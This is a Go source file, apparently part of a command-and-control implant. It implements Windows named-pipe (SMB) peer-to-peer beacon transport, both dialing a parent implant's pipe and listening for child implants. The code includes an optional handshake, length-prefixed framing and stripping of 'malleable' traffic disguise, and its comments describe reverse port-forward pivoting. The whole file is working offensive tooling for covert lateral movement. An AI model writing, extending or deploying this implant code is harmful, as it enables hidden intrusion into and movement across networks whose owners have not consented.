//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"strings"

	"github.com/Microsoft/go-winio"
)

// sendP2PSMBBeacon and p2pListenSMB are the Windows-specific P2P transports
// that use named pipes (via go-winio). The cross-platform rportfwd core lives
// in rportfwd_core.go so reverse port-forward pivoting works on every OS.

func sendP2PSMBBeacon(body []byte) []byte {
	pipeName := strings.TrimPrefix(P2PParent, "pipe://")
	pipePath := fmt.Sprintf(`\\.\pipe\%s`, pipeName)
	conn, err := winio.DialPipe(pipePath, nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB pipe dial to %s failed: %v\n", pipePath, err)
		}
		return nil
	}
	defer conn.Close()

	// Optional mutual-auth handshake (E2) before sending the envelope.
	if !p2pClientAuth(conn) {
		return nil
	}

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	// Strip any malleable cover the parent wrapped around the raw P2P frame.
	return stripMalleableWrapping(rbuf)
}

func p2pListenSMB() {
	ln, err := winio.ListenPipe(fmt.Sprintf(`\\.\pipe\%s`, P2PListenAddr), nil)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P SMB listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}
